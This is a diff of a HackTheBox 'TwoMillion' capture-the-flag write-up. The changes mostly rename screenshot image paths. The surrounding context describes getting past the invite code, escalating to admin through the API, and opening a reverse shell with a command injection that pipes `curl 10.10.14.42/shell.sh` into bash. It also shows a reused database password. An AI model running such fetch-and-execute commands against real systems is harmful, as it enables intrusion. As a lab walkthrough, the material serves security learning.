@@ -25,7 +25,7 @@ We have to add `2million.htb` to our `/etc/hosts` file to view the web applicati
 
 The website resembles the actual live HTB platform:
 
-<figure><img src="../../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (49) (1).png" alt=""><figcaption></figcaption></figure>
 
 The website also shows how long has HTB come since the start:
 
@@ -33,9 +33,9 @@ The website also shows how long has HTB come since the start:
 
 Anyways, we can attempt to register a user on this site and maybe find some sort of access control weakness. On the main page, there is a 'Join HTB' button, but it requires an invite code to access:
 
-<figure><img src="../../../.gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (54) (2).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (53) (1).png" alt=""><figcaption></figcaption></figure>
 
 I didn't have an invite code, so we'll have to leave this for now. I also don't have any credentials to register a user, so the website's applications have limited use as of now. We can do a directory and subdomain scan for this site. I ran a `feroxbuster` directory scan and a `wfuzz` subdomain scan. The `feroxbuster` scan returned some interesting stuff:
 
@@ -47,7 +47,7 @@ There was a `register` directory present.&#x20;
 
 I couldn't register an account because I still didn't have an invite code at all. I looked at the account in Burpsuite, and found this at the bottom of the page:
 
-<figure><img src="../../../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (52) (1).png" alt=""><figcaption></figcaption></figure>
 
 There's an `inviteapi.min.js` file that looks custom. Here's the contents of that file:
 
@@ -170,7 +170,7 @@ Adding that results in yet another error:
 
 Setting the value of that to 1 seems to work:
 
-<figure><img src="../../../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (51) (1).png" alt=""><figcaption></figcaption></figure>
 
 We can verify that we are an admin using the `/api/v1/admin/auth` endpoint.&#x20;
 
@@ -202,7 +202,7 @@ $ curl -X POST -H 'Content-Type: application/json' -H 'Cookie: PHPSESSID=1mf4jaa
 ```
 {% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (43) (1).png" alt=""><figcaption></figcaption></figure>
 
 We can get a reverse shell by replacing the command with `curl 10.10.14.42/shell.sh | bash`.&#x20;
 
@@ -249,7 +249,7 @@ DB_PASSWORD=SuperDuperPass123
 
 Using that, we can `su` to `admin`.
 
-<figure><img src="../../../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (56) (3).png" alt=""><figcaption></figcaption></figure>
 
 ### Mail --> CVE Exploit
 
@@ -325,7 +325,7 @@ This whole thing is in hex, so I used Cyberchef to decode it:
 
 Now it's being XOR'd with 'HackTheBox' as the key. The output can be decoded and piped to an XOR command with the specified key to find a hidden message:
 
-<figure><img src="../../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (50) (1).png" alt=""><figcaption></figcaption></figure>
 
 Here's the message:
 
